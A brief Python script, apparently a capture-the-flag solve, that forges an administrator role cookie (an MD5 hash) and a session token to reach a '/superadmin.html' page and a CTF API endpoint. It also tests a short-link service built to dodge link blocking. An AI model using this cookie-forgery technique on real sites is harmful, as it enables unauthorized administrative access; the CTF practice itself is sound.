# 测试生成短链接接口
import requests
from fake_useragent import UserAgent
import random
import json  # 处理json信息

# http://www.28fh.top/ 可乐防洪网系统

long_url = "whalefall.online"


def longSuo(long_url):
    se = requests.session()  # 创建session对象,因为可能要用cookie访问
    se.get("http://www.28fh.top/", headers={"User-Agent": str(UserAgent().random)})
    datafrom = {
        "?": "",
        "longurl": long_url,
        "type": "fksqkdcgsdmkrdlwcuelvmnnumibftrutvuyjsyfilkoqrppazciwoelmipkhfqjzieisvdvuoyjziydrqvuglcehpustcsfnzxi"
    }
    resp = se.post("http://www.28fh.top/dwz.php", data=datafrom).json()
    print(resp)
    short_url = resp["ae_url"]
    print(short_url)


# longSuo(long_url)

url = "http://45.113.201.36/superadmin.html"
header = {
    # role为 Administrtor 的MD5 32位
    "Cookie": "session=eyJ1aWQiOiIzOTc0NDM1NTIifQ.X5QT1A.vxPe7XWVccL6XWNDtU2lUwm-f78; role=7b7bc2512ee1fedcd76bdc68926d4f7b",
    "User-Agent": "bilibili Security Browser"
}
se = requests.session()

resp = se.get(url, headers=header).content.decode()
resp = se.get("http://45.113.201.36/api/ctf/4", headers=header)

print(resp.json())
